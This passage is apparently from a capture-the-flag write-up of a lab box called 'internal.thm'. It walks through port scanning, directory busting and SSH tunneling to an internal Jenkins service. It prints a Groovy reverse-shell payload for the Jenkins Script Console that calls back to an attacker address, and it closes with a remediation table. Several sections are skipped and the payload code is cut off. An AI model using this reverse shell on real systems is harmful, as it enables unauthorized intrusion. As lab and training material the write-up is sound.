2. Phase 1: Reconnaissance & Web Enumeration

2.1 Port Scanning (Nmap)

We initiate an Nmap service scan against target 10.49.187.241:

nmap -sT -sV -sC 10.49.187.241 -Pn

Open Ports:
- Port 22/tcp: OpenSSH 7.6p1 Ubuntu
- Port 80/tcp: Apache httpd 2.4.29 (Ubuntu)

2.2 Local DNS Resolution

The web server redirects or references the hostname internal.thm. We map this domain to our local /etc/hosts:

echo "10.49.187.241 internal.thm" | sudo tee -a /etc/hosts

2.3 Directory Busting (Gobuster)

We enumerate web paths using Gobuster:

gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Identified Directories:
- /blog (Status: 301) --> http://internal.thm/blog/ (WordPress)
- /wordpress (Status: 301) --> http://internal.thm/wordpress/
- /javascript (Status: 301)
- /phpmyadmin (Status: 301)

5. Phase 4: SSH Port Forwarding & Jenkins Exploitation

5.1 Discovering Internal Jenkins Service

In /home/aubreanna, we find jenkins.txt:

cat jenkins.txt



Internal Jenkins service is running on 172.17.0.2:8080

The Jenkins service is hosted in an internal Docker container unreachable from the external network.

5.2 SSH Local Port Forwarding

From our attacker system, we establish an SSH local port forward tunnel through aubreanna@internal.thm:

ssh -N -L 8080:172.17.0.2:8080 aubreanna@internal.thm

We authenticate with the discovered user password. The tunnel forwards 127.0.0.1:8080 on our local machine directly to 172.17.0.2:8080 in the internal Docker subnet.

5.4 Remote Code Execution via Jenkins Script Console

In the Jenkins administration menu, we navigate to Manage Jenkins > Script Console (http://127.0.0.1:8080/script):

We input a Groovy Java socket reverse shell targeting 192.168.132.94:4445:

String host="192.168.132.94";
int port=4445;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());

7. Security Mitigations & Remediation

Vulnerability Impact Recommended Remediation
Weak WordPress Admin Password Administrative CMS compromise and theme modification RCE. Enforce strong password complexity policies and implement rate limiting on wp-login.php.
Theme File Editor Enabled Allows authenticated administrators to inject PHP web shells. Disable the file editor in wp-config.php via define('DISALLOW_FILE_EDIT', true);.
Plaintext Credentials in Filesystem (wp-save.txt) Lateral movement and unauthorized user account takeover. Never store cleartext passwords in configuration notes; use encrypted secret storage.
Weak Jenkins Admin Password Container takeover and arbitrary Groovy code execution via Script Console. Mandate complex passwords, enable multi-factor authentication (MFA), and restrict access to /script.
Host Root Password Stored in Docker Container (note.txt) Complete host takeover. Strictly isolate container environments and never store host credentials inside Docker containers.
